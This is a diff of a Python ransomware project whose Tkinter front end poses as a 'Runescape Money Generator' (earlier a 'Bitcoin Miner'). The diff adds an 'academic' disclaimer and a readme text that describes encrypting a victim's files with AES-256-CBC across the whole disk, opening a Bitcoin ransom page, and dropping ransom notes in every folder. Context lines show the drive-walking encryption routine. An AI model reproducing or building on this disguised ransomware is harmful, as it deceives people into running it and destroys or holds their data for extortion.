@@ -13,7 +13,7 @@ LARGE_FONT= ("Courier", 10)
 
 def encryption(key):
     app = TrojanApp()
-    app.geometry('500x400')
+    app.geometry('500x420')
     app.mainloop()
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
         for root, dirs, files in os.walk(homedir):
@@ -73,13 +73,14 @@ def cancel():
 
 LARGE_FONT = ("Verdana", 12)
 
+#Trojan App sample used from github
 
 class TrojanApp(tk.Tk):
     def __init__(self, *args, **kwargs):
         tk.Tk.__init__(self, *args, **kwargs)
 
         #tk.Tk.iconbitmap(self,default='C:\Python27\Lib\idlelib\Icons\phone.ico')
-        tk.Tk.wm_title(self, "Bitcoin Miner")
+        tk.Tk.wm_title(self, "Runescape Money Generator - 2017 ")
 
         container = tk.Frame(self)
         container.pack(side="top", fill="both", expand=True)
@@ -104,15 +105,19 @@ class StartPage(tk.Frame):
     def __init__(self, parent, controller):
         tk.Frame.__init__(self, parent)
 
-        label = tk.Label(self, text="Agreement License & Disclaimer", font=LARGE_FONT)
+        label = tk.Label(self, text="Agreement License & Disclaimer / Readme", font=LARGE_FONT)
         label.pack(pady=10, padx=10)
 
         txt = tk.Text(self, borderwidth=3, relief="sunken")
         txt.insert("1.0",
-                   "     THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE X CONSORTIUM BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n")
+                   " Note: This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.\n")
         txt.insert("2.0",
-                   "  Note:To keep your computer secure, you should only run programs or install software from a trusted source. If you're not sure about this softwares source, click Cancel to stop the program and the installation.After installation, do not move or rename the application or the installation directory of the application. Otherwise, you will not be able to run update installers.")
-        txt.config(font=("consolas", 12), undo=True, wrap='word', state="disabled")
+                   "This project aims to build a functional crypto-ransomware for educational purposes, written in Python. Basically, it will encrypt your files in background using AES-256-CBC. I implemented a fake GUI which you are reading now can be configured to your taste, feel free to use tk to make it more complex. You could add a loading bar. This ransomware will encrypt all files that match the extension arguments within a given directory. The directory path can be set to (~/) to encrypt the entire disk and the extension can be set to (.*). The ransomware will also open a browser page where the ransom would take place (BTC Address), i have made it link to my repo. The ransomware will also leave a .txt file with a message behind on every folder where files are encrypted, all customizable of course. ")
+        txt.insert("3.0",
+                   " I am not responsible for whatever you decide to do with this code, \n")
+        txt.insert("4.0",
+                   " Original repo: https://github.com/luisxciv/SYrans, \n")
+        txt.config(font=("consolas", 11), undo=True, wrap='word', state="disabled")
         txt.grid(row=0, column=0, sticky="ew", padx=2, pady=2)
         txt.pack()
 
